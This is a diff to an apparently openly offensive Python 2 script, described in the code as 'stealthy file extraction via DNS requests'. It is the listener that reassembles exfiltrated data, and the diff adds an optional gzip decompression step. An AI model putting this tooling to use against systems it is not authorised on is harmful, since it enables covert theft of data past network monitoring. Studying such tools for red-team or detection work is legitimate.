@@ -1,9 +1,13 @@
+#!/usr/bin/env python
+#####################
+
 import socket
 import sys
 import binascii
 import time
 import random
 import hashlib
+import zlib
 	
 class DNSQuery:
   def __init__(self, data):
@@ -30,16 +34,30 @@ class DNSQuery:
       packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
     return packet
 
-def save_to_file(data, file_seed):
+def save_to_file(data, file_seed, z):
 
 	fname = "recieved_%s.bin" % file_seed 
-        print "\033[1;32m[!] Saving recieved bytes to ./%s\033[0m" % (fname)
-	f = open(fname, "wb")
+	flatdata = ""
 
 	for block in data:
-		f.write(binascii.unhexlify(block))
+		flatdata += block
 
+	if (z):
+	        print "\033[1;32m[!] Unzipping data.\033[0m"
+		x = zlib.decompressobj(16+zlib.MAX_WBITS)
+		flatdata = x.decompress(binascii.unhexlify(flatdata))	
+
+        print "\033[1;32m[!] Saving recieved bytes to ./%s\033[0m" % (fname)
+
+	f = open(fname, "wb")
+	
+	if (z):
+		f.write(flatdata)
+	else:
+		f.write(binascii.unhexlify(flatdata))
+	
 	f.close()
+
 	print "\033[1;32m[?] md5sum:\033[0m \033[1;31m%s\033[0m" % (hashlib.md5(open(fname, "r").read()).hexdigest())
 
 
@@ -60,13 +78,17 @@ Stealthy file extraction via DNS requests
 	
 if __name__ == '__main__':
 
+  z = False
+
   try:
 
     ip = sys.argv[1]
+    if "-z" in sys.argv:
+	z = True
   except:
 
     banner()
-    print "Usage: %s [listen_address]"
+    print "Usage: %s [listen_address] [-z (optional: unzip incoming data)]"
     exit(1)
 
   banner()
@@ -95,7 +117,7 @@ if __name__ == '__main__':
 
   except KeyboardInterrupt:
 
-    save_to_file(fdata, file_seed)
+    save_to_file(fdata, file_seed, z)
 
     print '\n\033[1;31m[!]\033[0m Closing...'
 
